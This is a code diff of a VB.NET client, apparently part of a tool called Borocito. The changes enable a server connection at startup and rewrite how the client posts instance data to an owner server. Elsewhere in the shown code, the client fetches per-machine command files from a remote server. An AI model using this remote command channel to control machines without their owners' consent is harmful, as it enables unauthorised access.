@@ -1,8 +1,9 @@
-﻿Imports System.Runtime.InteropServices
+﻿Imports System.IO
+Imports System.Net
+Imports System.Net.Http
+Imports System.Runtime.InteropServices
 Imports System.Text
 Imports Microsoft.Win32
-Imports System.Net
-Imports System.IO
 Module Utility
     Public tlmContent As String
     Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
@@ -45,7 +46,7 @@ Module GlobalUses
     Public DIRHome As String = DIRCommons & "\boro-get\" & My.Application.Info.AssemblyName
     Public compileVersion As String = My.Application.Info.Version.ToString &
         " (" & Application.ProductVersion & ") " &
-        "[17/03/2025 12:32]" 'Indicacion exacta de la ultima compilacion
+        "[17/08/2026 15:05]" 'Indicacion exacta de la ultima compilacion
 
     Public HttpOwnerServer As String
     Public UID As String
@@ -58,7 +59,7 @@ Module StartUp
         Try
             CommonActions()
             LoadRegedit()
-            'Boro_Comm.Connector.ConnectorManager()
+            Boro_Comm.Cliente.ConnectToServer()
         Catch ex As Exception
             AddToLog("Init@StartUp", "Error: " & ex.Message, True)
         End Try
@@ -109,13 +110,14 @@ Module ResponseAdministrator
             End Try
             Threading.Thread.Sleep(5000) '5 sec para evitar solapados
             If sendStatus Then
-                AddToLog("Network", "Processing: " & message, False)
+                AddToLog("SendToServer@ResponseAdministrator", "Processing: " & message, False)
                 'Obtener comando actual (evita interferir)
                 Dim remoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                 Dim localCommandFile As String = DIRHome & "\actualCommand.str"
                 If My.Computer.FileSystem.FileExists(localCommandFile) Then
                     My.Computer.FileSystem.DeleteFile(localCommandFile)
                 End If
+                'TODO : usar API para obtener los comandos de la instancia
                 My.Computer.Network.DownloadFile(remoteCommandFile, localCommandFile)
                 Dim lineas = IO.File.ReadAllLines(localCommandFile)
                 'Prepara el mensaje
@@ -140,32 +142,22 @@ Module ResponseAdministrator
         Try
             'AddToLog("Network", "Sending API Request...", False)
 
-            Dim request As HttpWebRequest = CType(WebRequest.Create(HttpOwnerServer & "/api.php"), HttpWebRequest)
             content = content.Replace("&", "{ampersand}")
             content = content.Replace("?", "{questionmark}")
-            Dim postData As String = "content=" & content
-            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
-            request.ContentType = "application/x-www-form-urlencoded"
-            request.ContentLength = byteArray.Length
-            request.UserAgent = My.Application.Info.AssemblyName & " / " & compileVersion
-            request.Method = "POST"
-            request.Headers("ident") = UID
-            request.Headers("class") = "COMMAND"
 
-            Dim dataStream = request.GetRequestStream()
-            dataStream.Write(byteArray, 0, byteArray.Length)
-            dataStream.Close()
-            Dim response As WebResponse = request.GetResponse()
-            dataStream = response.GetResponseStream()
-            Dim dataReader As New StreamReader(dataStream)
-            Dim respuesta As String = dataReader.ReadToEnd()
-            AddToLog("Network", "Response: " &
-                     CType(response, HttpWebResponse).StatusCode &
-                     " " & CType(response, HttpWebResponse).StatusDescription &
-                     vbCrLf & "    " & respuesta, False)
-            dataReader.Close()
-            dataStream.Close()
-            response.Close()
+            Dim formData As New Dictionary(Of String, String) From {
+                {"content", content}
+            }
+            Using body As New FormUrlEncodedContent(formData)
+                Using client As New HttpClient()
+                    client.DefaultRequestHeaders.Add("User-Agent", "Borocito boro-hear")
+                    client.DefaultRequestHeaders.Add("UUID", UID)
+                    Dim response As HttpResponseMessage = client.PostAsync(
+                        HttpOwnerServer & "/api/instance/",
+                        body
+                    ).Result
+                End Using
+            End Using
 
             Return True
         Catch ex As Exception
